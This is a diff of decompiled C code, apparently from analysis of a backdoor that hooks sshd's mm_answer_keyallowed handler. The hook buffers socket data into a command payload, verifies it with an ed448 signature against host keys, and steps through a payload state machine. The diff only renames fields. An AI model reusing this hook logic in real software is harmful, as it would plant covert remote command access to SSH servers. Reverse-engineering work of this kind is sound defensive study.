@@ -66,7 +66,7 @@ int mm_answer_keyallowed_hook(ssh *ssh,int sock,sshbuf *m)
   if (sshd_ctx == (sshd_ctx_t *)0x0) {
     return 0;
   }
-  if (::global_ctx->payload_data == (u8 *)0x0) {
+  if (::global_ctx->payload_buffer == (u8 *)0x0) {
     return 0;
   }
   orig_mm_answer_keyallowed = sshd_ctx->mm_answer_keyallowed_start;
@@ -90,7 +90,7 @@ int mm_answer_keyallowed_hook(ssh *ssh,int sock,sshbuf *m)
   payload_state = ctx->payload_state;
   if (payload_state == 3) {
 LAB_00109216:
-    payload_record = ctx->sshd_payload_ctx;
+    payload_record = ctx->payload_ctx;
     if (payload_record != (sshd_payload_ctx_t *)0x0) {
       payload_len = (ulong)payload_record->payload_total_size;
       payload_type = payload_record->command_type;
@@ -161,13 +161,13 @@ LAB_001092e5:
   }
   else if ((int)payload_state < 4) {
     if (payload_state == 0) {
-      if (ctx->current_data_size < 0xae) goto LAB_0010944f;
+      if (ctx->payload_bytes_buffered < 0xae) goto LAB_0010944f;
       payload_header_cursor = payload_seed_buf + 0x10;
       for (copy_idx = 0x29; copy_idx != 0; copy_idx = copy_idx + -1) {
         *payload_header_cursor = '\0';
         payload_header_cursor = payload_header_cursor + (ulong)zero_seed * -2 + 1;
       }
-      payload_record = (sshd_payload_ctx_t *)ctx->payload_data;
+      payload_record = (sshd_payload_ctx_t *)ctx->payload_buffer;
       payload_seed_buf[0] = '\0';
       payload_seed_buf[1] = '\0';
       payload_seed_buf[2] = '\0';
@@ -187,8 +187,8 @@ LAB_001092e5:
       if (((payload_record != (sshd_payload_ctx_t *)0x0) &&
           (ctx->sshd_sensitive_data != (sensitive_data *)0x0)) &&
          ((ctx->sshd_sensitive_data->host_pubkeys != (sshkey **)0x0 &&
-          (ctx->sshd_payload_ctx == (sshd_payload_ctx_t *)0x0)))) {
-        ctx->sshd_payload_ctx = payload_record;
+          (ctx->payload_ctx == (sshd_payload_ctx_t *)0x0)))) {
+        ctx->payload_ctx = payload_record;
         payload_header_buf[0] = '\0';
         payload_header_buf[1] = '\0';
         payload_header_buf[2] = '\0';
@@ -219,7 +219,7 @@ LAB_001092e5:
         if ((state_ok != FALSE) &&
            (state_ok = verify_signature(ctx->sshd_sensitive_data->host_pubkeys
                                       [ctx->sshd_host_pubkey_idx],payload_header_buf,0x3a,0x5a,
-                                      ctx->sshd_payload_ctx->ed448_signature,payload_seed_buf,ctx),
+                                      ctx->payload_ctx->ed448_signature,payload_seed_buf,ctx),
            state_ok != FALSE)) {
           ctx->payload_state = 1;
           payload_header_cursor = payload_seed_buf;
@@ -232,15 +232,15 @@ LAB_001092e5:
         }
       }
       ctx->payload_state = 0xffffffff;
-      ctx->sshd_payload_ctx = (sshd_payload_ctx_t *)0x0;
+      ctx->payload_ctx = (sshd_payload_ctx_t *)0x0;
     }
-    else if ((payload_state == 1) && (ctx->sshd_payload_ctx != (sshd_payload_ctx_t *)0x0)) {
-      payload_len = (ulong)ctx->sshd_payload_ctx->payload_total_size;
-      payload_data_offset = ctx->current_data_size;
+    else if ((payload_state == 1) && (ctx->payload_ctx != (sshd_payload_ctx_t *)0x0)) {
+      payload_len = (ulong)ctx->payload_ctx->payload_total_size;
+      payload_data_offset = ctx->payload_bytes_buffered;
       if (payload_data_offset <= payload_len) {
         if (payload_data_offset != payload_len) goto LAB_0010944f;
-        payload_len = ctx->payload_data_size;
-        sock_read_buf_len = ctx->sock_read_buf_size;
+        payload_len = ctx->payload_buffer_size;
+        sock_read_buf_len = ctx->sock_read_len;
         if ((payload_len < sock_read_buf_len) || (payload_data_offset = payload_data_offset - 0x72, payload_len - sock_read_buf_len <= payload_data_offset)) {
 LAB_00109471:
           if (libc_imports_ref->exit != (pfn_exit_t)0x0) {
@@ -269,7 +269,7 @@ LAB_00109471:
           *payload_header_cursor = '\0';
           payload_header_cursor = payload_header_cursor + (ulong)zero_seed * -2 + 1;
         }
-        payload_header_cursor = ctx->payload_data;
+        payload_header_cursor = ctx->payload_buffer;
         copy_idx = 0;
         do {
           header_copy_idx = copy_idx + 1;
@@ -281,9 +281,9 @@ LAB_00109471:
           payload_header_cursor[sock_copy_idx + payload_data_offset] = ctx->sock_read_buf[sock_copy_idx];
         }
         state_ok = verify_signature(ctx->sshd_sensitive_data->host_pubkeys[ctx->sshd_host_pubkey_idx],
-                                  ctx->payload_data,payload_data_offset + ctx->sock_read_buf_size,
-                                  ctx->payload_data_size,payload_header_buf,
-                                  ctx->sshd_payload_ctx->signed_header_prefix,ctx);
+                                  ctx->payload_buffer,payload_data_offset + ctx->sock_read_len,
+                                  ctx->payload_buffer_size,payload_header_buf,
+                                  ctx->payload_ctx->signed_header_prefix,ctx);
         if (state_ok == FALSE) {
           ctx->payload_state = 0xffffffff;
           goto LAB_00109471;
